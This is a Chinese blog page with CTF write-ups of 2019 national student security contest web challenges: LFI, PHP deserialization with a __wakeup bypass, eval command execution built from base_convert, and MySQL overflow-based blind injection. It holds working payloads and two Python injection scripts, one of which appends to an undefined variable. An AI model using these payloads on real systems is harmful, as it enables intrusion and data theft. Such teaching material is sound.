@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>第十二届全国大学生信息安全竞赛-Web | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第十二届全国大学生信息安全竞赛-Web">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/43152/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/7.png">
+<meta property="og:image" content="e:/fafu网安/blogs/source/img/国赛/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/12.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/13.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/14.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/15.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/16.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/17.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/18.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/19.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/20.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/21.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/23.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/24.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/国赛/22.png">
+<meta property="og:updated_time" content="2019-05-20T00:52:32.337Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第十二届全国大学生信息安全竞赛-Web">
+<meta name="twitter:description" content="ctf">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/国赛/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">第十二届全国大学生信息安全竞赛-Web</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#JustSoso"><span class="post-toc-number">1.</span> <span class="post-toc-text">JustSoso</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#love-math"><span class="post-toc-number">2.</span> <span class="post-toc-text">love_math</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#全宇宙最简单的SQL"><span class="post-toc-number">3.</span> <span class="post-toc-text">全宇宙最简单的SQL</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#RefSpace"><span class="post-toc-number">4.</span> <span class="post-toc-text">RefSpace</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-第十二届全国大学生信息安全竞赛-Web"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">第十二届全国大学生信息安全竞赛-Web</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-04-27 15:15:00" datetime="2019-04-27T07:15:00.000Z"  itemprop="datePublished">2019-04-27</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">13</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>第一次打国赛，emmm不得不说题目质量真的很高，一题都能卡学长一天，虽然一路跟着学长的思路复现下来，但是收获还是很多的，在这里做个复现的题解<a id="more"></a></p>
+<h4 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h4><p>根据源代码给出的提示，知道是先利用<code>LFI</code>读取<code>index.php</code>和<code>hint.php</code>的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img\国赛\1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>在<code>index.php</code>文件中，我们可以发现参数<code>$_GET[&#39;payload&#39;]</code>最后经过反序列化函数的处理，但是在之前将该参数经过<code>parse_url</code>函数的处理后的结果做了正则匹配过滤的处理，但是我们可以绕过<code>parse_url</code>函数，具体参考链接：<a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html</a> </p>
+<p>参考链接中提到，<code>parse_url</code>函数在处理<code>///</code>时会返回<code>false</code></p>
+<p>测试代码如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们可以看到，当URI的开头为<code>///</code>时，<code>parse_url</code>是无法解析出URL的相关信息的，返回<code>NULL</code></p>
+<p>在官方文档中对该函数的注释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line"></span><br><span class="line">parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///...）。其它任何协议都不能这样。</span><br></pre></td></tr></table></figure>
+<p>尽管该函数能解析不完整的<code>URL</code>，但是无法解析除<code>file:///</code>协议外的其他协议，当<code>parse_url</code>解析不出信息时，将返回<code>NULL</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>如此一来，我们绕过了<code>parse_url</code>函数，即可执行反序列化函数，接下来就是要查看类中的具体信息了，类的信息就在<code>hint.php</code>文件中</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们可以看到两个类<code>Handle</code>和<code>Flag</code>，要得到flag，我们只能通过调用<code>Flag</code>类的<code>getFlag()</code>方法执行最后的<code>highlight_file</code>方法，但是，通过一次反序列化对象，我们是无法直接调用到该方法的，所以，只有通过<code>Handle</code>类的魔术方法<code>__destruct</code>，它在对象被销毁是自动调用，<code>__constrct</code>则是对象创建时自动调用，调用<code>__destruct</code>方法后才能调用<code>getFlag()</code>方法，所以<code>Handle</code>类的<code>handle</code>属性，必须是一个<code>Flag</code>对象</p>
+<p>另外，我们可以注意到<code>Handle</code>类中还有一个魔术方法<code>__wakeup</code>，这是一个在对象被反序列化时会被自动调用的魔术方法，如果调用了，则会把对象中的所有属性置<strong>null</strong>，所以<code>__wakeup</code>就是我们必须要绕过的第二个地方，这里具体可以参考：<a href="https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/" target="_blank" rel="noopener">https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/</a></p>
+<p>里面提到了<code>__wakeup</code>魔术方法的一个<strong>bug</strong>，当我们将<code>object size</code>即类的对象个数改为比原有个数大时，<code>__wakeup</code>方法在对象被反序列化时就不会被调用</p>
+<p>测试代码如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到，正常情况下的反序列化会调用到<code>__wakeup</code>，将<code>handle</code>属性置<strong>null</strong>，导致无法执行<code>getFlag</code>方法，另外我们还可以注意到，稀有属性序列化后有特别的属性格式<code>\x00Handle\x00handle</code></p>
+<p>现在我们将对象个数<strong>1</strong>修改为比1大的数字，将上面代码的测试段修改为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$h = $_GET[<span class="string">'h'</span>];</span><br><span class="line">unserialize($h);</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="E:\fafu网安\blogs\source\img\国赛\8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>这里发现反序列化函数出现了报错，这是因为我这里测试的PHP版本为7.0过高的原因，可见这个Bug需要较低的PHP版本，将PHP版本修改为5.4后，再次执行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>没有报错，说明成功了，但是这里没有读出内容，是因为要执行<code>getFlag</code>的最后读取文件，还有第三个约束条件</p>
+<p><code>if($this-&gt;token === $this-&gt;token_flag)</code></p>
+<p>如果按照正常的代码逻辑来看，两个的随机数的md5值是几乎不可能相等的，但是我们可以通过类似指针的原理，让<code>$this-&gt;token = &amp;this-&gt;token_flag</code>，这样<code>$this-&gt;token</code>的值会随着<code>$this-&gt;token_flag</code>值的改变而改变，生成最终的<code>Handle</code>对象的代码如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>序列化后的<code>Handle</code>对象为：<code>O:6:&quot;Handle&quot;:2:{s:14:&quot;\x00Handle\x00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;3ba716f4a7265eef381f7cef9e271f27&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code>，再结合前面分析的两个分别绕过<code>__wakeup</code>和<code>parse_url</code></p>
+<p>最终payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;\x00Handle\x00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;3ba716f4a7265eef381f7cef9e271f27&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h4 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h4><p>在源码中发现<code>calc.php</code>，访问得到源代码，如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>很明显，看到<code>eval</code>函数，这题考察的是命令执行拿flag，但是<code>$content</code>会先后经过黑白名单的校验并且长度不能大于等于80</p>
+<p>黑名单是限制了我们输入的一些特殊字符，白名单则是限制了我们使用的函数</p>
+<p>这里限制了我们只能使用数学函数，通过查阅各种数学函数的作用，发现能利用的只有<code>base_convert</code>，它能在<code>2</code>进制到<code>36</code>进制之间进行任意进制的转换，而36进制能表示字符<code>0-9a-z</code>，所以我们可以通过该函数来构造一些简单的函数，例如<code>phpinfo</code>，我们先把它转换成十进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo base_convert(&apos;phpinfo&apos;, 36, 10);</span><br><span class="line">55490343972</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>这里大家可能有疑问，为什么一定要转化为十进制数，其实十进制以下都可以，但是十六进制就不行了，因为十六进制中会包含英文字母，而英文字母会在白名单校验中的正则匹配函数匹配到而执行失败</p>
+<p>我们还可以执行一些其他命令，例如<code>system(&#39;dir&#39;)</code>：<code>base_convert(1751504350,10,36)(base_convert(17523,10,36))</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\14.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到目录下存在<strong>flag.php</strong>文件</p>
+<p>但是，单靠一个<code>base_convert</code>函数，我们是无法构建出能读取<strong>flag.php</strong>文件的函数，因为<code>base_convert</code>函数只能构造出<code>0-9a-z</code>范围内的字符，例如空格，点号，都是无法通过进制转换进行构造的</p>
+<p>所以这里想到用php的十六进制转字符串的函数<code>hex2bin</code>，但是该函数只使用与<strong>php7.0</strong>版本以上，正好该题目环境是7.0以上，所以该函数可以利用，同样用<code>base_convert</code>函数构造<code>hex2bin</code>：<code>base_convert(37907361743,10,36)</code>，该函数传入的参数必须是十六进制数，又因为十六进制数难免包含字母，这样会被白名单给过滤，所以我们可以再利用一个数学函数<code>dechex</code>，它能将十进制数转换为十六进制数，也就是说，我们可以通过<code>base_convert(37907361743,10,36)(dechex())</code>构造出函数<code>hex2bin()</code>，但是，这里<code>eval</code>语句最前面还有<code>echo</code>，如果构造<code>system(hex2bin())</code>，则需要调用到两次<code>base_convert</code>和一次<code>dechex</code>，而这样比然长度会超过<strong>80</strong>，所以应该这题要通过其他参数引入的方式来打破字符长度的限制</p>
+<p>开始构造多<code>$_GET</code>传参</p>
+<p>首先先通过传入的参数<code>$c</code>去定义一个变量，变量的值等于<code>_GET</code>，当然，这里变量名必须是<strong>数学函数</strong>，所以这里采用最短的<code>pi</code>作为变量名，这是为了尽可能的压缩长度，构造的payload为：<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324))</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\15.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>上图即执行了语句<code>eval(&#39;echo $pi=base_convert(37907361743,10,36)(dechex(1598506324));&#39;)</code></p>
+<p>接下来，再通过<code>$_GET[]($_GET[])</code>进行多GET执行命令</p>
+<p>但是这里黑名单过滤了<code>[]</code>，而<code>{}</code>是可以用来代替索引数组的</p>
+<p>最终构造的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pow&#125;(($$pi)&#123;pi&#125;)&amp;pow=system&amp;pi=type%20flag.php</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\16.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>因为比赛环境关了的原因，本地测试采用的windows系统，linux系统将payload中的<code>type</code>改为<code>cat</code>即可</p>
+<h4 id="全宇宙最简单的SQL"><a href="#全宇宙最简单的SQL" class="headerlink" title="全宇宙最简单的SQL"></a>全宇宙最简单的SQL</h4><p>这题的<strong>waf</strong>会将<code>|</code>，<code>or</code>，<code>sleep</code>，<code>if</code>，<code>benchmark</code>，<code>case</code>等字符替换为<strong>QwQ</strong></p>
+<p>返回的信息有两种：</p>
+<ul>
+<li>SQL语法错误时，会显示<strong>数据库操作失败</strong>。例如：<code>username=admin&#39;&amp;password=123</code></li>
+<li>SQL语法正确时，如果账号密码不对，会显示<strong>登录失败</strong>。例如：<code>username=admin&amp;password=123</code></li>
+</ul>
+<p>排除了延时注入，报错注入，布尔注入。本题采用了一种<strong>基于语法</strong>的盲注，利用<strong>逻辑运算符</strong>和<strong>溢出报错</strong>来进行注入，这里采用了<code>pow(9999,100)</code>，这个表达式的值在MYSQL中已经超出了double范围，会溢出。然后构造以下payload来进行盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; ^ 1 and substr(database(),1,1)=&apos;a&apos; and pow(9999,100)#&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>在后台构成的SQL查询语句大致就是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> ^ <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'a'</span> <span class="keyword">and</span> <span class="keyword">pow</span>(<span class="number">9999</span>,<span class="number">100</span>)# <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'123'</span>;</span><br></pre></td></tr></table></figure>
+<p>加入异或符号<code>^</code>是为了能够保证，即使<code>admin</code>用户名不存在，异或1的结果后仍然为<code>true</code>，保证能执行到后面的盲注判断语句<code>substr()=&#39;&#39;</code>。如果该判断语句为<code>true</code>，则会执行<code>pow(9999,100)</code>，产生<strong>溢出错误</strong>，页面返回的结果便是<strong>数据库操作失败</strong>；如果该判断语句为<code>false</code>，则不会执行<code>pow(9999,100)</code>，返回的结果为<strong>登录失败</strong></p>
+<p>通过这种盲注，我写了如下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.106.224.151:52105/"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">s = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&amp;*()QWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"' ^ 1 and substr(database(),%d,1)='%s' and pow(9999,100)#"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        print(<span class="string">"checking"</span>,j)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            print(<span class="string">"passwd:"</span>,passwd)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>注出数据库名：<code>ctf</code></p>
+<p>但是，题目将<code>or</code>替换<code>QwQ</code>，所以我们无法通过正常利用<code>information_schema</code>库来得到表名和列名信息</p>
+<p>有篇参考文章：<a href="https://nosec.org/home/detail/2245.html" target="_blank" rel="noopener">如何在不知道MySQL列名的情况下注入出数据</a></p>
+<p>里面提到了，在无法知道列名的情况下，我们可以通过<code>select 1,2 union select * from user</code>来注出列下的所有内容，我们只需要猜测表名和查询列数即可</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\17.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\18.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\19.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>所以，构造以下payload即可注出密码字段的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; ^ 1 and substr((select `2` from (select 1,2 union select * from user)a limit 1,1),1,1)=&apos;a&apos; and pow(9999,100)#&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>脚本内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.106.224.151:52105/"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">s = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&amp;*()QWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"' ^ 1 and substr((select `2` from (select 1,2 union select * from user)a limit 1,1),%d,1)='%s' and pow(9999,100)#"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        print(<span class="string">"checking"</span>,j)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>最终注出的<code>admin</code>用户的密码<code>f1ag@1s-at_/fll1llag_h3r3</code></p>
+<p>但是仍然无法登陆，后面没有思路便作罢</p>
